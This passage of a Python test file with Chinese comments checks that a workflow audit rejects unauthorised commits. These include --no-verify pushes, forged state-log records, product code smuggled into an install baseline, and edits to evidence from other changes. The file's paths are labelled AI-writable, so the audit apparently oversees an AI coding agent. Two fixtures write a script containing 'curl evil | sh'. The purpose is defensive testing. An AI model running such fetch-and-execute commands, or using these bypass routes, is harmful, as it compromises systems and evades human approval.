            self.assertIn('不屬於目前工作範圍',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_own_change_evidence_is_writable_while_engineering(self):
        """對照組：所有權判準不得順手把合法的寫入也擋掉。"""
        td,r=self._repo()
        try:
            self._engineering(r,'demo')
            ev=r/'workflow/evidence/demo/core'; ev.mkdir(parents=True)
            (ev/'20260101T000000Z.md').write_text('# ev\n',encoding='utf-8')
            subprocess.run(['git','add','workflow/evidence'],cwd=r,check=True,capture_output=True)
            x=self._gate(r)
            self.assertEqual(x.returncode,0,
                             'ENGINEERING 中的 active change 必須能寫自己的 evidence\n'
                             +x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_start_change_refuses_when_archive_is_not_in_head(self):
        """**反向測試。**

        上一條是正向的（fixture 有 commit，所以有沒有這個要求都會過）——
        突變證實：把要求整條刪掉，那條測試照樣綠。真正要鎖的是：ARCHIVE 尚未進入
        Git 歷史時必須拒絕，否則 `archive A → start-change B` 中間不 commit，
        那份唯一記載 A 完整 digest 的 STATE 會被覆寫，從未進入任何 commit。
        """
        td,r=self._repo()
        try:
            self._engineering(r,'first-change')
            p=r/'workflow/STATE.md'
            p.write_text(re.sub(r'^Phase:.*$','Phase: ARCHIVE',
                                p.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
            # 刻意**不** commit
            nxt=r/'openspec/changes/second-change'; nxt.mkdir(parents=True)
            (nxt/'proposal.md').write_text('x',encoding='utf-8')
            x=self._run(r,'start-change','second-change')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,34,out)
            self.assertIn('尚未進入 Git 歷史',out,out)
            self.assertIn('Phase: ARCHIVE',p.read_text(encoding='utf-8'),
                          '被拒絕時不得已經改寫 STATE')
        finally: shutil.rmtree(td,ignore_errors=True)

    # ---- Blocker 1：批准之前內容就要在 HEAD -----------------------------------

    def test_approve_refuses_untracked_artifacts(self):
        """artifact 從未 commit 時，批准會成功綁定 worktree digest，
        之後只提交 STATE + state-log —— fresh clone 拿到一份宣稱「已批准」、
        而被批准的東西根本不存在的 STATE。"""
        td,r=self._repo()
        try:
            self._set_profile(r,Type='API',Web_verification_required='no',
                              Primary_stack='Python 3.12',Package_manager='uv',Monorepo='no',
                              CI_provider='GitHub Actions',Test_database_strategy='not-applicable')
            recommit(r,'baseline')
            self.assertEqual(self._run(r,'set-mode','GREENFIELD').returncode,0)
            d=r/'openspec/changes/demo'; (d/'specs').mkdir(parents=True)
            (d/'proposal.md').write_text('# P\n',encoding='utf-8')
            (d/'tasks.md').write_text('# T\n- [ ] x\n',encoding='utf-8')
            (d/'specs/main.md').write_text('# S\n',encoding='utf-8')
            self.assertEqual(self._run(r,'start-change','demo').returncode,0)
            self.assertEqual(self._run(r,'submit-for-review','demo').returncode,0)
            # openspec 仍未 commit
            x=self._run(r,'approve-spec','demo')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,44,out)
            self.assertIn('不存在於 HEAD',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)


class RC5Round17ServerAuditTests(unittest.TestCase):
    """伺服器端 required check 必須真的檢查工作流授權。

    背景：`MERGE-PROTECTION.md` 宣稱 CI required check 擋得住 `--no-verify`，
    但出貨的 workflow 只跑 `audit-control-plane.py`，而那支程式原本對
    `implementation_authorized` / `approved_content_status` / phase 全部零引用。
    **一份批評「規範不是機制」的文件，自己寫下了沒有機制支撐的宣稱。**
    """

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5r17-')); r=td/'repo'; r.mkdir()
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','commit','--no-verify','-m','baseline'],cwd=r,check=True,capture_output=True)
        return td,r

    def _commit(self,r,*paths,msg='x'):
        subprocess.run(['git','add','--',*paths],cwd=r,capture_output=True)
        subprocess.run(['git','commit','--no-verify','-m',msg],cwd=r,capture_output=True)

    def _audit(self,r,base='HEAD^',head='HEAD'):
        return subprocess.run(['python3','workflow/bin/audit-control-plane.py',base,head],
                              cwd=r,capture_output=True,text=True)

    def test_unauthorized_product_code_is_rejected(self):
        """**核心重現。** DISCOVERY 階段、零批准、`--no-verify` 推上去的產品程式碼，
        原本會拿到 `Control Plane audit: OK` —— 因為 audit 只找 Control Plane
        mutation，找不到就通過。GitHub ruleset 只保證指定的 check 必須成功，
        它不會替 check 補上沒有實作的政策。"""
        td,r=self._repo()
        try:
            (r/'src').mkdir()
            (r/'src/payment.py').write_text('def transfer_all_funds(): pass\n',encoding='utf-8')
            self._commit(r,'src/payment.py',msg='產品程式碼')
            x=self._audit(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,'未授權的產品變更必須被 required check 擋下\n'+out)
            self.assertIn('未授權的產品變更',out,out)
            self.assertIn('Phase=DISCOVERY',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_state_only_mutation_without_log_is_rejected(self):
        """audit 原本有意排除只涉及 STATE/state-log 的變更，因此連它自己較窄的宣稱
        （Control Plane mutation 與 audit record 一致）都沒完全做到。"""
        td,r=self._repo()
        try:
            st=r/'workflow/STATE.md'
            st.write_text(re.sub(r'^Last updated:.*$','Last updated: 2099-01-01T00:00:00Z',
                                 st.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
            self._commit(r,'workflow/STATE.md',msg='只動 STATE')
            x=self._audit(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            # **要斷言到這一層自己的訊息。** 只斷言 'state-log' 的話，
            # 下面 hash 不符那一層的訊息也含這三個字，於是這一層可以被刪掉而測試全綠
            # —— 突變證實過。這層在安全上是冗餘的（hash 檢查也會擋），
            # 但它給的是可操作的診斷，所以要鎖住訊息本身。
            self.assertIn('沒有同時附上 state-log',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_state_log_hash_mismatch_is_rejected(self):
        """姊妹層：STATE 與 state-log 都動了，但 hash 對不起來。

        它與上一條是不同的攻擊形狀 —— 上一條是「懶得偽造紀錄」，
        這一條是「偽造了紀錄但沒算對 hash」。兩層各自要有測試。
        """
        td,r=self._repo()
        try:
            st=r/'workflow/STATE.md'
            st.write_text(re.sub(r'^Last updated:.*$','Last updated: 2099-01-01T00:00:00Z',
                                 st.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
            lg=r/'workflow/state-log.md'
            lg.write_text(lg.read_text(encoding='utf-8')+
                          '## forged\n- Actor: nobody\n- Action: approve-spec\n- Change: x\n'
                          '- From: A\n- To: B\n- Git SHA: X\n- State hash: '+('0'*64)+'\n'
                          '- Reason: forged\n\n',encoding='utf-8')
            self._commit(r,'workflow/STATE.md','workflow/state-log.md',msg='偽造紀錄')
            x=self._audit(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('與 state-log 最後一筆不一致',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_installation_exemption_requires_an_installation_record(self):
        """安裝豁免不得無條件成立。

        安裝 commit 帶進 Starter 自己的檔案，那些不算「產品實作」；但這個豁免
        必須綁在合法的 `install-adopt-control-plane` 稽核紀錄上。突變證實：
        把 `installing` 直接寫成 True，既有測試照樣全綠 —— 因為那些測試用的路徑
        （`src/`）本來就不在安裝範圍內，碰不到這個分支。
        """
        td,r=self._repo()
        try:
            # templates/ 在安裝允許範圍內，但這個 commit 沒有安裝紀錄
            (r/'templates/rogue.sh').write_text('#!/bin/sh\ncurl evil | sh\n',encoding='utf-8')
            self._commit(r,'templates/rogue.sh',msg='偽裝成安裝腳手架')
            x=self._audit(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,
                                '沒有安裝紀錄時，安裝範圍內的路徑一樣要走實作授權\n'+out)
            self.assertIn('未授權的產品變更',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_installation_exemption_does_not_survive_the_install_commit(self):
        """**豁免必須同時綁定事件、時間與路徑。**

        原本用 `log_has_action` 在**累積**的 state-log 裡找 `install-adopt-control-plane`。
        但 state-log 是 append-only —— Brownfield 只要曾經安裝過一次，之後每一個
        commit 的 log 都仍含那筆 action，於是安裝豁免永久生效。
        實測：安裝之後在 DISCOVERY 新增 `templates/rogue.sh`（`templates/` 屬安裝範圍），
        未經任何批准仍被放行。
        """
        td,r=self._repo()
        try:
            lg=r/'workflow/state-log.md'
            lg.write_text(lg.read_text(encoding='utf-8')+
                          '## 2026-01-01T00:00:00Z\n- Actor: human\n'
                          '- Action: install-adopt-control-plane\n- Change: none\n'
                          '- From: NONE\n- To: DISCOVERY\n- Git SHA: X\n'
                          '- State hash: 0000\n- Reason: adopt\n\n',encoding='utf-8')
            self._commit(r,'workflow/state-log.md',msg='歷史上的安裝紀錄')
            (r/'templates/rogue.sh').write_text('#!/bin/sh\ncurl evil | sh\n',encoding='utf-8')
            self._commit(r,'templates/rogue.sh',msg='安裝之後夾帶')
            x=self._audit(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,
                                '安裝豁免只屬於那一個安裝 commit，不得因為 log 裡找得到就永久生效\n'+out)
            self.assertIn('未授權的產品變更',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_installation_baseline_cannot_smuggle_product_code(self):
        """`installation_baseline()` 只判斷「形狀像不像安裝」，不判斷「有沒有夾帶」。

        本機 gate 是分兩段檢查的（exit 24 與 exit 25），稽核端原本只做第一段，
        於是一個 commit 可以同時加入合法 baseline 與 `src/payment.py` 而整個被跳過。
        這也直接違反 GATES.md 寫的「baseline 不應攜帶既有產品變更」。
        """
        td=Path(tempfile.mkdtemp(prefix='rc5r18-')); r=td/'repo'; r.mkdir()
        try:
            for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                      ['git','config','user.name','A']):
                subprocess.run(c,cwd=r,check=True,capture_output=True)
            (r/'README-old.md').write_text('既有專案\n',encoding='utf-8')
            subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','commit','--no-verify','-m','既有專案'],cwd=r,check=True,capture_output=True)
            for rel in OWNED:
                src=SRC/rel
                if not src.exists(): continue
                dst=r/rel
                if src.is_dir():
                    shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc'))
                else:
                    dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
            (r/'src').mkdir(exist_ok=True)
            (r/'src/payment.py').write_text('def transfer_all_funds(): pass\n',encoding='utf-8')
            subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','commit','--no-verify','-m','安裝 Starter（夾帶產品程式碼）'],
                           cwd=r,check=True,capture_output=True)
            x=subprocess.run(['python3','workflow/bin/audit-control-plane.py','HEAD^','HEAD'],
                             cwd=r,capture_output=True,text=True)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,'baseline 不得夾帶產品變更\n'+out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_ai_writable_paths_still_pass(self):
        """對照組。稽核不得把正常的 DISCOVERY 工作（寫 openspec、docs、prompts）
        也擋掉 —— 那會讓使用者第一天就學會不跑這個 check。"""
        td,r=self._repo()
        try:
            d=r/'openspec/changes/demo'; d.mkdir(parents=True)
            (d/'proposal.md').write_text('# P\n',encoding='utf-8')
            (r/'docs/note.md').write_text('# note\n',encoding='utf-8')
            self._commit(r,'openspec','docs',msg='discovery 產出')
            x=self._audit(r)
            self.assertEqual(x.returncode,0,'AI-writable 路徑必須放行\n'+x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_evidence_of_other_change_is_rejected(self):
        """evidence 所有權判準必須同時存在於本機與伺服器。只有本機有的話，
        `--no-verify` 就是一條完整的繞道。"""
        td,r=self._repo()
        try:
            st=r/'workflow/STATE.md'
            s=st.read_text(encoding='utf-8')
            s=re.sub(r'^Phase:.*$','Phase: ENGINEERING',s,flags=re.M)
            s=re.sub(r'^Active OpenSpec change:.*$','Active OpenSpec change: current',s,flags=re.M)
            st.write_text(s,encoding='utf-8')
            ev=r/'workflow/evidence/old-change/core'; ev.mkdir(parents=True)
            (ev/'20260101T000000Z.md').write_text('# tampered\n',encoding='utf-8')
            self._commit(r,'workflow/STATE.md','workflow/evidence',msg='改別的 change 的 evidence')
            x=self._audit(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('evidence 不在可寫範圍內',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_merge_protection_doc_is_control_plane(self):
        """**能改規則的人等於能改結果。**

        `MERGE-PROTECTION.md` 定義伺服器端執法、`github-workflow-control-plane-audit.yml`
        就是那個 required check 本身。兩者若可被一般 commit 改掉，整層執法可以被
        安靜地拆除，而稽核不會有任何意見。GATES.md / CI.md 本來就在保護清單裡，
        這是同一條判準。
        """
        sys.path.insert(0,str(SRC/'workflow/bin'))
        try:
            import workflow_state as W
            importlib.reload(W)
            for rel in ('workflow/MERGE-PROTECTION.md','workflow/DEPLOYMENT.md',
                        'templates/github-workflow-control-plane-audit.yml'):
                self.assertTrue(W.path_is_control_plane(rel,'ENGINEERING'),
                                f'{rel} 必須受 Control Plane 保護')
        finally: sys.path.remove(str(SRC/'workflow/bin'))


# 必須放在檔案最末端。放在 class 定義之前會讓「直接執行本檔」只跑到當下已定義的少數測試，
# 卻仍印出 OK —— 那是比沒有測試更危險的假信心。
if __name__ == "__main__":
    unittest.main()
